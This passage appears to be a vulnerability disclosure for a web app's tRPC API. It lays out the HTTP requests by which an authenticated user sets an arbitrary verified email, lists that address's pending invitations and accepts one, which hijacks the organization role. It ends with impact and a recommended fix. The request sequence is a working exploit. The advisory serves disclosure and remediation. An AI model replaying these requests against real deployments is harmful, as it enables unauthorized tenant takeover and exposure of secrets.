## Steps to reproduce

Starting with any authenticated attacker account and a pending invitation for an unregistered address.

```http
POST /api/trpc/user.update
Content-Type: application/json
Cookie: better-auth.session_token=ATTACKER_SESSION

{"json":{"email":"new-admin@victim.example","emailVerified":true}}
```

On a subsequent authenticated request, enumerate the claimed address's invitations.

```http
GET /api/trpc/user.getInvitations
Cookie: better-auth.session_token=ATTACKER_SESSION
```

Accept the returned ID.

```http
POST /api/auth/organization/accept-invitation
Content-Type: application/json
Cookie: better-auth.session_token=ATTACKER_SESSION

{"invitationId":"VICTIM_INVITATION_ID"}
```

The attacker receives the role stored in the invitation. Re-authenticate before the last two requests if the deployment caches session user fields.

## Impact

An authenticated user who knows or guesses an address with a pending invitation can join the victim organization with the invitation's role. Hijacking an owner or administrator invitation exposes tenant secrets and managed-host functions, which can lead to host command execution.

## Recommendation

Remove `email` and `emailVerified` from `apiUpdateUser`. Change email only through a dedicated flow that verifies the new mailbox before updating the account. Never accept `emailVerified` from a profile request.
